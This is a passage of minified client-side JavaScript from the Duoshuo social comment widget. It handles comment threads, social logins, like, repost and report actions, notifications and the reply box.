                    f.readyState === 4 ? l() : f.onreadystatechange = l;
                    return
                }
            }
            e != "GET" && (r._method = "POST");
            var h = "cb_" + Math.round(Math.random() * 1e6);
            w[h] = function(e) {
                switch (e.code) {
                case 0:
                    o(e);
                    break;
                default:
                    u && u(e),
                    I("\u51fa\u9519\u5566(" + e.code + "): " + e.errorMessage),
                    e.errorTrace && I(e.errorTrace)
                }
            },
            r.callback = "DUOSHUO['" + h + "']",
            F(w.hostUrl + t + ".jsonp?" + w.param(r))
        },
        injectStylesheet: function(e) {
            var n = t.createElement("link");
            n.type = "text/css",
            n.rel = "stylesheet",
            n.href = e,
            a.appendChild(n)
        },
        setCustomStyle: function(e) {
            h || (h = t.createElement("style"), h.type = "text/css", a.appendChild(h)),
            e = e.replace(/\}/g, "}\n");
            if (h.styleSheet) h.styleSheet.cssText = e;
            else {
                while (h.firstChild) h.removeChild(h.firstChild);
                h.appendChild(t.createTextNode(e))
            }
        },
        compileStyle: function(e) {
            var t = "",
            n = {
                textbox: "#ds-thread #ds-reset .ds-replybox .ds-textarea-wrapper"
            };
            if (e) for (var r in e) t += n[r] + "{" + e[r] + "}\n";
            return t
        },
        init: function(e, t) {
            e && !N[e] && (N[e] = t || {
                type: "EmbedThread"
            }),
            w.initView && w.initView()
        }
    },
    E = t.all,
    S,
    x = w.support = function() {
        var n = t.createElement("div");
        n.innerHTML = '<a href="/a">a</a><input type="checkbox"/>';
        var i = n.getElementsByTagName("a")[0],
        o = n.getElementsByTagName("input")[0],
        u = {
            placeholder: "placeholder" in o,
            touch: "ontouchstart" in e || "onmsgesturechange" in e,
            hrefNormalized: i.getAttribute("href") === "/a",
            iOS: f.match(/ \((iPad|iPhone|iPod);( U;)? CPU( iPhone)? OS /),
            android: f.match(/ \(Linux; U; Android /)
        };
        return S = !s && typeof n.style.maxHeight == "undefined",
        u.authInWin = e.postMessage && e.screen.width > 800 && !u.iOS && !u.android && r.origin,
        u
    } (),
    T = function(e, n) {
        var r = (t.body || t.documentElement).style;
        if (typeof r == "undefined") return ! 1;
        if (typeof r[e] == "string") return n ? e: !0;
        var i = ["Moz", "Webkit", "ms"],
        e = e.charAt(0).toUpperCase() + e.substr(1),
        s = 0;
        for (; s < i.length; s++) if (typeof r[i[s] + e] == "string") return n ? i[s] + e: !0
    },
    N = w.selectors = {
        ".ds-thread": {
            type: "EmbedThread"
        },
        ".ds-recent-comments": {
            type: "RecentComments"
        },
        ".ds-recent-visitors": {
            type: "RecentVisitors"
        },
        ".ds-top-users": {
            type: "TopUsers"
        },
        ".ds-top-threads": {
            type: "TopThreads"
        },
        ".ds-login": {
            type: "LoginWidget"
        },
        ".ds-thread-count": {
            type: "ThreadCount"
        }
    },
    C = w.pagelets = [],
    k = {
        post: "\u53d1\u5e03",
        posting: "\u6b63\u5728\u53d1\u5e03",
        settings: "\u8bbe\u7f6e",
        reply: "\u56de\u590d",
        like: "\u9876",
        repost: "\u8f6c\u53d1",
        report: "\u4e3e\u62a5",
        "delete": "\u5220\u9664",
        reply_to: "\u56de\u590d ",
        reposts: "\u8f6c\u53d1",
        comments: "\u8bc4\u8bba",
        floor: "\u697c",
        latest: "\u6700\u65b0",
        earliest: "\u6700\u65e9",
        hottest: "\u6700\u70ed",
        share_to: "\u5206\u4eab\u5230:",
        leave_a_message: "\u8bf4\u70b9\u4ec0\u4e48\u5427\u2026",
        no_comments_yet: "\u8fd8\u6ca1\u6709\u8bc4\u8bba\uff0c\u6c99\u53d1\u7b49\u4f60\u6765\u62a2",
        repost_reason: "\u8bf7\u8f93\u5165\u8f6c\u53d1\u7406\u7531",
        hot_posts_title: "\u88ab\u9876\u8d77\u6765\u7684\u8bc4\u8bba",
        comments_zero: "\u6682\u65e0\u8bc4\u8bba",
        comments_one: "1\u6761\u8bc4\u8bba",
        comments_multiple: "{num}\u6761\u8bc4\u8bba",
        reposts_zero: "\u6682\u65e0\u8f6c\u53d1",
        reposts_one: "1\u6761\u8f6c\u53d1",
        reposts_multiple: "{num}\u6761\u8f6c\u53d1",
        weibo_reposts_zero: "\u6682\u65e0\u65b0\u6d6a\u5fae\u535a",
        weibo_reposts_one: "1\u6761\u65b0\u6d6a\u5fae\u535a",
        weibo_reposts_multiple: "{num}\u6761\u65b0\u6d6a\u5fae\u535a",
        qqt_reposts_zero: "\u6682\u65e0\u817e\u8baf\u5fae\u535a",
        qqt_reposts_one: "1\u6761\u817e\u8baf\u5fae\u535a",
        qqt_reposts_multiple: "{num}\u6761\u817e\u8baf\u5fae\u535a"
    },
    L = function(e, t, n, r) {
        w.ajax("GET", e, t, n ||
        function() {},
        r)
    },
    A = function(e, t, n, r) {
        w.ajax("POST", e, t, n ||
        function() {},
        r)
    },
    O = [],
    M,
    _ = [],
    D = function(t) {
        if (! ("WebSocket" in e && i)) return ! 1;
        _.push(i.stringify(t)),
        M || (M = w.webSocket = new WebSocket("ws://ws.duoshuo.com:8201/"), M.onopen = function() {
            var e;
            if (M.readyState === 1) while (e = _.shift()) M.send(e)
        },
        M.onmessage = function(e) {
            try {
                var t = 0,
                n, r = i.parse(e.data)
            } catch(s) {
                return
            }
            switch (r.type) {
            case "post":
                for (; t < w.pagelets.length; t++) n = w.pagelets[t],
                n.threadId == r.thread_id && n.onMessage(r);
                break;
            case "notification":
                O.push(r),
                lt();
                break;
            default:
            }
        },
        e.addEventListener("beforeunload",
        function() {
            M.close()
        })),
        M.onopen()
    },
    P = w.Collections = {},
    H = w.Views = {},
    B = w.Callbacks = {},
    j = w.openDialog = function(e) {
        return w.dialog !== n && w.dialog.el.remove(),
        w.dialog = (new H.Dialog('<div class="ds-dialog"><div class="ds-dialog-inner ds-rounded"><div class="ds-dialog-body">' + e + '</div><div class="ds-dialog-footer"><a href="http://duoshuo.com/" target="_blank" class="ds-logo"></a><span>\u793e\u4f1a\u5316\u8bc4\u8bba\u6846</span></div><a class="ds-dialog-close" href="javascript:void(0)" title="\u5173\u95ed"></a></div></div>')).open()
    },
    F = w.injectScript = function(r, i) {
        var s = t.createElement("script"),
        o = t.head || t.getElementsByTagName("head")[0] || t.documentElement;
        s.type = "text/javascript",
        s.src = r,
        s.async = "async",
        s.charset = "utf-8",
        i && (s.onload = s.onreadystatechange = function(t, r) {
            if (r || !s.readyState || /loaded|complete/.test(s.readyState)) s.onload = s.onreadystatechange = null,
            o && s.parentNode && o.removeChild(s),
            s = n,
            r || i.call(e)
        }),
        o.insertBefore(s, o.firstChild)
    },
    I = w.log = function(e) {
        typeof console == "object" && console.log(e)
    },
    q = w.smilies = {},
    R = ["EmbedThread", "RecentComments", "RecentVisitors", "TopUsers", "TopThreads", "LoginWidget", "ThreadCount"],
    U = 0,
    z,
    W = function() {
        var e = {},
        t = 0;
        for (; t < arguments.length; t++) arguments[t] && ft(e, arguments[t]);
        var n = w.param(e);
        return n ? "?" + n: ""
    },
    X = function() {
        var e = w.getCookie("duoshuo_token");
        return e ? {
            jwt: e
        }: z.remote_auth ? {
            short_name: z.short_name,
            remote_auth: z.remote_auth
        }: n
    },
    V = function() {
        return ! z && (z = e.duoshuoQuery) && tt.trigger("queryDefined"),
        z
    };
    for (var $ in Object.prototype) return alert("Object.prototype\u4e0d\u4e3a\u7a7a\uff0c\u8bf7\u4e0d\u8981\u7ed9Object.prototype\u8bbe\u7f6e\u65b9\u6cd5");
    var J = w.templates = {
        userUrl: function(e) {
            return e.url
        },
        avatarUrl: function(e, t) {
            return e.avatar_url || nt.data.default_avatar_url
        },
        userAnchor: function(e) {
            var t = J.userUrl(e);
            return t ? '<a rel="nofollow author" target="_blank" href="' + p(t) + '">' + p(e.name) + "</a>": p(e.name)
        },
        avatarImg: function(e, t) {
            return '<img src="' + p(J.avatarUrl(e, t)) + '" alt="' + p(e.name) + '"' + (t ? ' style="width:' + t + "px;height:" + t + 'px"': "") + "/>"
        },
        avatar: function(e, t) {
            var n = J.avatarImg(e, t),
            r = J.userUrl(e);
            return r ? '<a rel="nofollow author" target="_blank" href="' + p(r) + '" ' + (e.user_id ? " onclick=\"this.href='" + w.hostUrl + "/user-url/?user_id=" + e.user_id + "';\"": "") + ' title="' + p(e.name) + '">' + n + "</a>": n
        },
        timeHtml: function(e, t) {
            return e ? t ? '<a href="' + t + '" target="_blank" rel="nofollow" class="ds-time" datetime="' + e + '" title="' + w.fullTime(e) + '">' + w.elapsedTime(e) + "</a>": '<span class="ds-time" datetime="' + e + '" title="' + w.fullTime(e) + '">' + w.elapsedTime(e) + "</span>": ""
        },
        serviceIcon: function(e, t) {
            return '<a href="javascript:void(0)" class="ds-service-icon' + (t ? "-grey": "") + " ds-" + e + '" data-service="' + e + '" title="' + w.sourceName[e] + '"></a>'
        },
        loginButtons: function(e) {
            return '<div class="ds-login-buttons"><p>\u793e\u4ea4\u5e10\u53f7\u767b\u5f55:</p><div class="ds-social-links">' + J.serviceList() + J.additionalServices() + "</div></div>"
        },
        poweredBy: function(e) {
            return '<p class="ds-powered-by"><a href="http://duoshuo.com" target="_blank" rel="nofollow">' + p(e) + "</a></p>"
        },
        indicator: g('<div id="ds-indicator"></div>'),
        waitingImg: g('<div id="ds-waiting"></div>'),
        serviceList: function(e) {
            var t = '<ul class="ds-service-list">',
            n = ["weibo", "qq", "renren", "douban"],
            r = 0;
            for (; r < n.length; r++) t += J.loginItem(n[r], e);
            return t + '<li><a class="ds-more-services" href="javascript:void(0)">\u66f4\u591a\u00bb</a></li>' + "</ul>"
        },
        additionalServices: function(e) {
            var t = '<ul class="ds-service-list ds-additional-services">',
            n = ["kaixin", "netease", "sohu", "baidu", "google"],
            r = 0;
            for (; r < n.length; r++) t += J.loginItem(n[r], e);
            return t + "</ul>"
        },
        loginItem: function(e, t) {
            var n = J[t ? "bindUrl": "loginUrl"](e);
            return '<li><a href="' + n + '" rel="nofollow" class="ds-service-link ds-' + e + '">' + w.serviceNames[e] + (rt.data.social_uid[e] ? ' <span class="ds-icon ds-icon-ok"></span>': "") + "</a>" + "</li>"
        },
        loginUrl: function(e, t) {
            return t || (t = {}),
            z.sso && z.sso.login && (t.sso = 1, t.redirect_uri = z.sso.login),
            w.hostUrl + "/login/" + e + "/" + W(t)
        },
        bindUrl: function(e) {
            return w.hostUrl + "/bind/" + e + "/" + W(z.sso && z.sso.login ? {
                sso: 1,
                redirect_uri: z.sso.login
            }: null, X())
        },
        logoutUrl: function() {
            return w.hostUrl + "/logout/" + W(z.sso && z.sso.logout ? {
                sso: 1,
                redirect_uri: z.sso.logout
            }: null)
        },
        likePost: function(e) {
            return '<a class="ds-post-likes" href="javascript:void(0);"><span class="ds-icon ds-icon-like"></span>' + k.like + (e.likes > 0 ? "(" + e.likes + ")": "") + "</a>"
        },
        ctxPost: function(e, t, n) {
            var r = K(e);
            return '<li class="ds-ctx-entry"' + (n ? ' style="display:none"': "") + ' data-post-id="' + e.post_id + '"><div class="ds-avatar">' + J.avatar(r) + '</div><div class="ds-ctx-body"><div class="ds-ctx-head">' + J.userAnchor(r) + J.timeHtml(e.created_at, e.url) + (t >= 0 ? '<div class="ds-ctx-nth" title="' + w.fullTime(e.created_at) + '">' + (t + 1) + k.floor + "</div>": "") + '</div><div class="ds-ctx-content">' + e.message + (t >= 0 ? '\u3000\u3000\u3000\u3000\u3000\u3000\u3000<div class="ds-comment-actions' + (e.vote > 0 ? " ds-post-liked": "") + '">' + J.likePost(e) + ' <a class="ds-post-repost" href="javascript:void(0);"><span class="ds-icon ds-icon-share"></span>' + k.repost + "</a>" + ' <a class="ds-post-reply" href="javascript:void(0);"><span class="ds-icon ds-icon-reply"></span>' + k.reply + "</a>" + "</div>": "") + "</div></div></li>"
        }
    },
    K = function(e) {
        return ut[e.author_id] && ut[e.author_id].data || e.author
    },
    Q = function(e) {
        var t = [];
        for (var n in e) t.push('<input type="hidden" name="' + n + '" value="' + p(e[n]) + '" />');
        return t.join("\n")
    };
    for (; U < R.length; U++) w[R[U]] = function(e) {
        return function(t, n) {
            n = n || {},
            n.type = e,
            t && !N[t] && (N[t] = n),
            w.initSelector && w.initSelector(t, n)
        }
    } (R[U]),
    w["create" + R[U]] = function(e) {
        return function(n, r) {
            var i = t.createElement(n);
            for (var s in r) i.setAttribute("data-" + s, r[s]);
            return w[e](i),
            i
        }
    } (R[U]);
    w.RecentCommentsWidget = w.RecentComments;
    var G = 0,
    Y = w.Class = function() {};
    Y.extend = function(e) {
        function r() { ! G && this.init && this.init.apply(this, arguments)
        }
        G = 1;
        var t = new this;
        G = 0;
        for (var n in e) t[n] = e[n];
        return r.prototype = t,
        r.prototype.constructor = r,
        r.extend = arguments.callee,
        r
    };
    var Z = w.Event = Y.extend({
        on: function(e, t) {
            var r = this.handlers || (this.handlers = {});
            return r[e] === n && (r[e] = []),
            r[e].push(t),
            this
        },
        trigger: function(e, t) {
            var n = (this.handlers || (this.handlers = {}))[e];
            if (n) for (var r = 0; r < n.length; r++) if (n[r].call(this, t) === !1) break;
            return this
        }
    }),
    et = w.Model = Z.extend({
        init: function(e) {
            this.data = e
        },
        reset: function(e) {
            this.data = e,
            this.trigger("reset")
        },
        remove: function(e) {
            this.data.splice(e, 1),
            this.trigger("reset")
        },
        set: function(e, t) {
            if (t === n) for (var r in e) this.data[r] = e[r];
            else this.data[e] = t;
            this.trigger("reset")
        }
    }),
    tt = w.events = new Z,
    nt = w.site = new et,
    rt = w.visitor = new et,
    it = w.unread = new et,
    st = w.threads = {},
    ot = w.postPool = {},
    ut = w.users = {};
    tt.on("queryDefined",
    function() {
        var e = z.short_name;
        w.hostUrl = e ? l + "//" + e + "." + w.DOMAIN: w.REMOTE,
        z.theme && pt(z.theme);
        if (o) {
            var t = o["ds_site_" + e],
            n = o["ds_lang_" + e];
            t && nt.reset(i.parse(t)),
            n && ft(k, i.parse(n))
        }
    }),
    V(),
    w.loaded.jQuery && (w.jQuery = e.jQuery),
    w.require("jQuery",
    function() {
        function dt(e, t, n) {
            if (e.find(".ds-post[data-post-id=" + t.post_id + "]")[0]) return;
            return e.find(".ds-post-placeholder").remove(),
            i(J.post(t, n)).hide()[n.order == "asc" ? "appendTo": "prependTo"](e).slideDown(function() {})
        }
        function vt(e, t) {
            var n;
            this.delegate("a.ds-post-likes", "click",
            function(e) {
                if (ct()) return gt(),
                !1;
                var t = i(this).parent();
                return liked = t.hasClass("ds-post-liked"),
                matches = i(this).html().match(/\((\d+)\)/),
                likes = (matches ? parseInt(matches[1]) : 0) + (liked ? -1 : 1),
                A("/api/posts/vote", {
                    post_id: t.closest(".ds-ctx-entry, .ds-post-self").attr("data-post-id"),
                    vote: liked ? 0 : 1
                }),
                i(this).html(i(this).html().replace(/\(\d+\)/, "") + (likes ? "(" + likes + ")": "")),
                t[liked ? "removeClass": "addClass"]("ds-post-liked"),
                !1
            }).delegate("a.ds-post-repost", "click",
            function(e) {
                var t = i(this).closest(".ds-post-self"),
                n = ot[t.attr("data-post-id")];
                return w.repostDialog(n, ""),
                !1
            }).delegate("a.ds-post-delete", "click",
            function(t) {
                if (confirm("\u786e\u5b9a\u8981\u5220\u9664\u8fd9\u6761\u8bc4\u8bba\u5417\uff1f")) {
                    var n = i(this).closest(".ds-post-self");
                    A("/api/posts/remove", {
                        post_id: n.attr("data-post-id")
                    }),
                    n.parent().fadeOut(200,
                    function() {
                        e.data.comments--,
                        e.updateCounter("duoshuo"),
                        i(this).remove()
                    })
                }
                return ! 1
            }).delegate("a.ds-post-report", "click",
            function(e) {
                if (confirm("\u786e\u5b9a\u8981\u4e3e\u62a5\u8fd9\u6761\u8bc4\u8bba\u5417\uff1f")) {
                    var t = i(this).closest(".ds-post-self");
                    A("/api/posts/report", {
                        post_id: t.attr("data-post-id")
                    }),
                    alert("\u611f\u8c22\u60a8\u7684\u53cd\u9988\uff01")
                }
                return ! 1
            }).delegate("a.ds-post-reply", "click",
            function(r) {
                var s = i(this),
                o = s.closest(".ds-comment-actions");
                if (o.hasClass("ds-reply-active")) n.el.fadeOut(200,
                function() {
                    i(this).detach()
                }),
                o.removeClass("ds-reply-active");
                else {
                    var u = s.closest(".ds-ctx-entry, .ds-post-self");
                    n ? n.actionsBar.removeClass("ds-reply-active") : (n = new H.Replybox(e), n.render(!0).el.addClass("ds-inline-replybox").detach()),
                    n.el.find("[name=parent_id]").val(u.attr("data-post-id")),
                    n.el.show().appendTo(s.closest(".ds-ctx-body, .ds-comment-body")).find("textarea").focus(),
                    n.actionsBar = o.addClass("ds-reply-active"),
                    t.max_depth <= 1 ? n.postList = e.postList.el: (n.postList = u.siblings(".ds-children"), n.postList[0] || (n.postList = i('<ul class="ds-children"></ul>').insertAfter(u)))
                }
                return ! 1
            }).delegate("a.ds-weibo-comments", "click",
            function(e) {
                var n = i(this).closest(".ds-post-self"),
                r = n.attr("data-post-id"),
                s = n.data("source");
                if (n.attr("data-root-id") == 0) {
                    var o = n.siblings(".ds-children");
                    o[0] ? o.remove() : (o = i('<ul class="ds-children"></ul>').insertAfter(n), L("/api/posts/listComments", bt({
                        post_id: r
                    }),
                    function(e) {
                        l(e),
                        o.append(i.map(e.response,
                        function(e) {
                            return J.post(e, t)
                        }).join(""))
                    }))
                }
                return ! 1
            }).delegate("a.ds-weibo-reposts", "click",
            function(t) {
                var n = i(this).closest(".ds-post-self"),
                r = ot[n.attr("data-post-id")],
                s = r.data.source;
                if (!rt.data.social_uid[s == "qqt" ? "qq": s]) {
                    mt(s);
                    return
                }
                var o = r.data.root_id,
                u = o != "0" ? ot[o] : r,
                a = "";
                if (o != "0") {
                    var f = K(r.data);
                    a = (s == "weibo" ? "//@" + f.name: "|| @" + f.qqt_account) + ":" + r.data.message
                }
                return w.repostDialog(u, a, e, s),
                !1
            }).delegate("a.ds-expand", "click",
            function(e) {
                var t = i(this).parent();
                return t.siblings().show(),
                t.remove(),
                !1
            }),
            x.touch || this.delegate("a.ds-comment-context, .ds-avatar, .ds-user-name", "mouseenter",
            function(t) {
                var n = this;
                if (bubbleOutTimer && $.owner == n) clearTimeout(bubbleOutTimer),
                bubbleOutTimer = 0;
                else {
                    var r = i(n);
                    Y = setTimeout(function() {
                        Y = 0,
                        $.owner = n,
                        tt();
                        var t = r.offset(),
                        i = e.el.offset(),
                        s = r.innerWidth() / 2,
                        o = e.el.innerHeight() - (t.top - i.top) + 6,
                        u = t.left - i.left - 35 + (s > 35 ? 35 : s);
                        try {
                            if (r.hasClass("ds-comment-context")) G.attr("id", "ds-ctx-bubble").attr("data-post-id", r.attr("data-post-id")).html('<ul id="ds-ctx">' + J.ctxPost(ot[r.attr("data-parent-id")].data) + "</ul>" + '<div class="ds-bubble-footer"><a class="ds-ctx-open" href="javascript:void(0);">\u67e5\u770b\u5bf9\u8bdd</a></div>');
                            else if (r.hasClass("ds-avatar") || r.hasClass("ds-user-name")) {
                                var a = {},
                                f = a.user_id = r.attr("data-user-id");
                                if (!f) throw "no info";
                                G.attr("id", "ds-user-card").attr("data-user-id", f).empty(),
                                ut[f] ? G.html(J.userInfo(ut[f].data)) : L("/api/users/profile", bt(a),
                                function(e) {
                                    var t = e.response;
                                    ut[f] ? ut[f].set(t) : ut[f] = new et(t),
                                    $.owner == n && G.html(J.userInfo(t))
                                })
                            }
                            $.css({
                                bottom: o,
                                left: u
                            }).appendTo(e.innerEl)
                        } catch(l) {
                            $.detach()
                        }
                    },
                    200)
                }
            }).delegate("a.ds-comment-context, .ds-avatar, .ds-user-name", "mouseleave",
            function() {
                Y ? (clearTimeout(Y), Y = 0) : bubbleOutTimer || bubbleOut()
            })
        }
        function mt(e) {
            var t = J[ct() ? "loginUrl": "bindUrl"](e);
            x.authInWin && O(e, t) || (r.href = t)
        }
        function gt() {
            var e = j("<h2>\u793e\u4ea4\u5e10\u53f7\u767b\u5f55</h2>" + J.serviceList() + J.additionalServices()).el.find(".ds-dialog").css("width", "300px");
            M(e)
        }
        function bt(e) {
            var n = {
                require: "site,visitor,nonce,serverTime,lang" + (yt++?"": ",unread,log,extraCss"),
                site_ims: o && o["ds_site_" + z.short_name + ":timestamp"],
                lang_ims: o && o["ds_lang_" + z.short_name + ":timestamp"],
                referer: t.referrer
            };
            z.stylePatch && (n.style_patch = z.stylePatch);
            for (var r in n) n[r] && (!S || encodeURIComponent(n[r]).length < 200) && (e[r] = n[r]);
            return e
        }
        var i = w.jQuery,
        s = i(e),
        a = i(t),
        l = w.loadRequire = function(e) {
            e.serverTime && (c = (new Date).getTime() - e.serverTime * 1e3),
            e.visitor && (!rt.data && e.visitor.user_id && u && !u.checkPermission() && D({
                logged_user_id: e.visitor.user_id
            }), rt.reset(e.visitor)),
            e.site && (nt.reset(e.site), ht("ds_site_" + z.short_name, e.site, e.serverTime)),
            !w.theme && nt.data.theme && pt(nt.data.theme),
            e.lang && (ft(k, e.lang), ht("ds_lang_" + z.short_name, e.lang, e.serverTime));
            if (e.stylesheets) for (var t = 0; t < e.stylesheets.length; t++) w.injectStylesheet(e.stylesheets[t]);
            e.nonce && (w.nonce = e.nonce),
            e.style && w.setCustomStyle((e.style || "") + w.compileStyle(z.component_style)),
            e.unread && it.reset(e.unread)
        },
        h = function(e) {
            e.stopPropagation()
        },
        g = function(e) { (e.ctrlKey && e.which == 13 || e.which == 10) && i(this.form).trigger("submit")
        },
        y = function(e) {
            var t = i(this);
            t.height(Math.max(54, t.next(".ds-hidden-text").text(this.value).height() + 27))
        },
        O = function(t, n) {
            var i = {
                weibo: [760, 600],
                renren: [420, 322],
                qq: [504, 445],
                netease: [810, 645],
                sohu: [972, 600],
                google: [600, 440],
                taobao: [480, 585]
            } [t] || [550, 400];
            return e.open(n + (n.indexOf("?") == -1 ? "?": "&") + w.param({
                origin: r.origin || "http://" + r.host
            }), "_blank", "width=" + i[0] + ",height=" + i[1] + ",toolbar=no,menubar=no,location=yes")
        },
        M = function(e, t) {
            x.authInWin && e.find(t || "a.ds-service-link").click(function(e) {
                var t = this.href.match(/\/(login|bind)\/(\w+)\//i);
                if (!t || !w.serviceNames[t[2]]) return;
                return ! O(t[2], this.href)
            })
        },
        _ = function(e) {
            return x.touch && e.addClass("ds-touch"),
            T("transition") || e.addClass("ds-no-transition"),
            S && e.addClass("ds-ie6"),
            i.support.opacity || e.addClass("ds-no-opacity"),
            e
        },
        B = function(e) {
            if (!x.placeholder) {
                var t = e.attr("placeholder");
                e.val(t).focus(function() {
                    this.value === t && (this.value = "")
                }).blur(function() {
                    this.value === "" && (this.value = t)
                })
            }
            return e
        };
        if (e.postMessage) {
            var F = function(e) {
                if (e.origin === "http://duoshuo.com") switch (e.data.type) {
                case "login":
                    r.href = e.data.redirectUrl;
                    break;
                default:
                }
            };
            e.addEventListener ? e.addEventListener("message", F, !1) : e.attachEvent && e.attachEvent("onmessage", F)
        }
        w.scrollTo = function(e) {
            var t = e.offset().top; (t < s.scrollTop() || t > s.scrollTop() + s.height()) && i("html, body").animate({
                scrollTop: t - 40
            },
            200, "swing")
        },
        w.toJSON = function(e) {
            var t = /\r?\n/g,
            n = /^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,
            r = /^(?:select|textarea)/i,
            s = e.map(function() {
                return this.elements ? i.makeArray(this.elements) : this
            }).filter(function() {
                return this.name && !this.disabled && (this.checked || r.test(this.nodeName) || n.test(this.type))
            }).map(function(e, n) {
                var r = i(this).val();
                return r == null ? null: i.isArray(r) ? i.map(r,
                function(e, r) {
                    return {
                        name: n.name,
                        value: e.replace(t, "\r\n")
                    }
                }) : {
                    name: n.name,
                    value: r.replace(t, "\r\n")
                }
            }).toArray(),
            o = {};
            return i.each(s,
            function() {
                o[this.name] = this.value
            }),
            o
        };
        var R = w.Widget = Z.extend({
            init: function(e, t) {
                this.el = e,
                this.options = t || {},
                this.render()
            },
            render: function() {},
            reset: function() {},
            load: function(e) {
                switch (e.code) {
                case 0:
                    l(e),
                    this.onload(e);
                    break;
                default:
                    this.onError(e)
                }
            },
            onload: function(e) {
                this.el.html(J[this.tmpl].call(J, e.response, i.extend(this.options, e.options)))
            },
            onMessage: function() {},
            onError: function(e) {
                I("\u51fa\u9519\u5566(" + e.code + "): " + e.errorMessage),
                e.errorTrace && I(e.errorTrace)
            }
        }),
        U = function(e) {
            var t = {
                "unread-comments": {
                    title: "\u65b0\u7559\u8a00\u53ca\u56de\u590d",
                    apiUrl: "/api/users/unreadComments",
                    tmpl: function(e) {
                        return '<li data-thread-id="' + e.thread.thread_id + '">' + i.map(e.authors, J.userAnchor).join("\u3001") + ' \u5728 <a class="ds-read" href="' + e.thread.url + '#comments" target="_blank">' + p(e.thread.title || "\u65e0\u6807\u9898") + '</a> \u4e2d\u56de\u590d\u4e86\u4f60 <a class="ds-delete ds-read" title="\u77e5\u9053\u4e86" href="javascript:void(0)">\u77e5\u9053\u4e86</a></li>'
                    },
                    read: function(e) {
                        var t = e.attr("data-thread-id");
                        A("/api/threads/read", {
                            thread_id: t
                        }),
                        it.data.comments--
                    }
                },
                "unread-notifications": {
                    title: "\u7cfb\u7edf\u6d88\u606f",
                    apiUrl: "/api/users/unreadNotifications",
                    tmpl: function(e) {
                        return '<li data-notification-id="' + e.notification_id + '" data-notification-type="' + e.type + '">' + e.content + ' <a class="ds-delete ds-read" title="\u77e5\u9053\u4e86" href="javascript:void(0)">\u77e5\u9053\u4e86</a></li>'
                    },
                    read: function(e) {
                        var t = e.attr("data-notification-id");
                        A("/api/notifications/read", {
                            notification_id: t
                        }),
                        it.data.notifications--
                    }
                }
            } [e],
            n = j("<h2>" + t.title + "</h2>" + '<ul class="ds-unread-list"></ul>');
            n.on("close", w.resetNotify);
            var r = n.el.find(".ds-unread-list").delegate(".ds-delete", "click",
            function(e) {
                return i(this).parent().remove(),
                r.children().length === 0 && n.close(),
                !1
            }).delegate(".ds-read", "click",
            function(e) {
                t.read(i(this).parent())
            });
            i("#ds-notify").hide(),
            L(t.apiUrl, {},
            function(e) {
                n.el.find(".ds-unread-list").html(i.map(e.response, t.tmpl).join("\n"))
            }),
            u && u.checkPermission() && u.requestPermission(lt)
        };
        w.resetNotify = function() {
            var e = i("#ds-notify"),
            n = it.data;
            e[0] || (e = i('<div id="ds-notify"></div>').css({
                hidden: {
                    display: "none"
                },
                "top-right": {
                    top: "24px",
                    right: "24px"
                },
                "bottom-right": {
                    bottom: "24px",
                    right: "24px"
                }
            } [nt.data.notify_position]).delegate(".ds-notify-unread a", "click",
            function(e) {
                return U(i(this).data("type")),
                !1
            }).appendTo(t.body)),
            e.html('<div id="ds-reset"><a class="ds-logo" href="http://duoshuo.com/" target="_blank" title="\u591a\u8bf4"></a><ul class="ds-notify-unread"><li' + (n.comments ? "": ' style="display:none;"') + '><a data-type="unread-comments" href="javascript:void(0);">\u4f60\u6709' + n.comments + "\u6761\u65b0\u56de\u590d</a></li><li" + (n.notifications ? "": ' style="display:none;"') + '><a data-type="unread-notifications" href="javascript:void(0);">\u4f60\u6709' + n.notifications + "\u6761\u7cfb\u7edf\u6d88\u606f</a></li></ul></div>")[(n.comments || n.notifications) && nt.data.notify_position !== "hidden" && !i(".ds-dialog")[0] ? "show": "hide"]()
        },
        it.on("reset", w.resetNotify),
        J.replybox = function(e, t) {
            var n = e.options,
            r = rt.data,
            i = [],
            s = "",
            o,
            u = {
                thread_id: e.threadId,
                parent_id: "",
                nonce: w.nonce
            };
            for (var a in r.repostOptions) r.repostOptions[a] && (i.push(a), o = 1),
            s += J.serviceIcon(a, !r.repostOptions[a]);
            return '<div class="ds-replybox"><a class="ds-avatar"' + (ct() ? ' href="javascript:void(0);" onclick="return false"': ' href="' + w.REMOTE + "/settings/avatar/" + W(X()) + '" target="_blank" title="\u8bbe\u7f6e\u5934\u50cf"') + ">" + J.avatarImg(r) + "</a>" + '<form method="post">' + Q(u) + '<div class="ds-textarea-wrapper ds-rounded-top">' + '<textarea name="message" title="Ctrl+Enter\u5feb\u6377\u63d0\u4ea4" placeholder="' + p(k.leave_a_message) + '"></textarea>' + '<pre class="ds-hidden-text"></pre>' + "</div>" + '<div class="ds-post-toolbar">' + '<div class="ds-post-options ds-gradient-bg">' + '<span class="ds-sync">' + (!ct() && s ? '<input id="ds-sync-checkbox' + (t ? "-inline": "") + '" type="checkbox" name="repost" ' + (o ? 'checked="checked" ': "") + 'value="' + i.join(",") + '"> <label for="ds-sync-checkbox' + (t ? "-inline": "") + '">' + k.share_to + "</label>" + s: "") + "</span>" + "</div>" + '<button class="ds-post-button" type="submit">' + p(k.post) + "</button>" + '<div class="ds-toolbar-buttons">' + (n.use_smilies ? '<a class="ds-toolbar-button ds-add-emote" title="\u63d2\u5165\u8868\u60c5"></a>': "") + (n.use_images && n.parse_html_enabled ? '<a class="ds-toolbar-button ds-add-image" title="\u63d2\u5165\u56fe\u7247"></a>': "") + "</div>" + "</div>" + "</form>" + "</div>"
        },
        H.Replybox = function(e) {
            this.embedThread = e
        },
        H.Replybox.prototype = {
            render: function(e) {
                function T(e) {
                    e.data("submitting", !0),
                    e.find(".ds-post-button").addClass("ds-waiting").html(k.posting)[0].disabled = !0
                }
                function N(e) {
                    e.data("submitting", !1),
                    e.find(".ds-post-button").removeClass("ds-waiting").html(k.post)[0].disabled = !1
                }
                var n = this,
                r = n.embedThread,
                s = r.options,
                u = function(e) {
                    w.require("smilies",
                    function() {})
                },
                a = n.el = i(J.replybox(r, e)).click(u),
                f = a.find("form"),
                l = f.find("input[type=checkbox]")[0],
                c = f.find("a.ds-service-icon, a.ds-service-icon-grey"),
                h = B(f.find("textarea")).focus(u).keyup(g).keyup(y).bind("focus mousedown mouseup keyup", m),
                d = a.find(".ds-add-emote").click(function(e) {
                    var r = w.smiliesTooltip;
                    return d.toggleClass("ds-expanded").hasClass("ds-expanded") ? (r || (r = w.smiliesTooltip = new H.SmiliesTooltip, r.render(), w.require("smilies",
                    function() {
